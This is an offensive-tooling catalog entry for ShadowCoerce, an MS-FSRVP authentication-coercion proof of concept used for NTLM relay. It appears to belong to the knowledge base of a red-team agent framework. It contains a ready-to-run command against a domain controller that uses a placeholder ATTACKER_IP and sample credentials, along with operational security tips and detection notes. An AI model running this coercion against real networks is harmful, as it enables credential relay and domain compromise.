---
name: ShadowCoerce
category: coercion-relay
subcategories: [authentication-coercion, ms-fsrvp, ntlm-relay]
tradecraft_tags: [coercion, shadow-copy, ms-fsrvp, ntlm-relay, vss]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/ShutdownRepo/ShadowCoerce
  license: MIT
  maintained: false
binary_type: python-script
binary_filename: shadowcoerce.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  MS-FSRVP calls (File Server Remote VSS Protocol) are unusual from non-file-server
  contexts. IsPathShadowCopied / IsPathSupported RPC calls from workstations are
  anomalous and may trigger NTA (network traffic analysis) signatures.
usage_examples:
  - description: Coerce DC authentication via shadow copy protocol
    args: "python3 shadowcoerce.py -u jon.snow -p Password123 ATTACKER_IP DC_IP"
opsec_notes: |
  Python-only — infrastructure side. Another fallback coercion method when other
  protocols are patched or blocked. Use Coercer for a unified interface. MS-FSRVP
  requires the File Server VSS Agent Service to be present on the target (more common
  on file servers than DCs).
gotchas: |
  MS-FSRVP is more commonly available on file servers than DCs. Verify the target
  machine has the File Server VSS Agent Service running. Python-only.
related_ttps: [coercer, petitpotam, dfscoerce, spoolsample]
alternatives: [coercer]
common_args:
  listener:
    description: Attacker IP for coerced auth
    typical_values: ["192.168.56.100"]
    required: true
  target:
    description: Target machine IP or FQDN
    typical_values: ["192.168.56.10"]
    required: true
  -u:
    description: Domain username
    typical_values: ["jon.snow"]
  -p:
    description: Password
    typical_values: ["Password123"]
last_updated: 2026-05-29
---

# ShadowCoerce

MS-FSRVP (File Server Remote VSS Protocol) authentication coercion PoC. Abuses the
`IsPathShadowCopied` / `IsPathSupported` RPC calls to force NTLM authentication from
a target file server or DC. Another fallback coercion method for when MS-EFSRPC and
MS-RPRN are patched or blocked.

## Typical use cases
- Fallback coercion when other methods are unavailable
- Coerce file server authentication for NTLM relay

## How Sage uses this
Infrastructure-side fallback. Prefer Coercer for unified coverage.

## Apollo-specific note
Python-only — run from attacker infrastructure, not from Apollo agent.
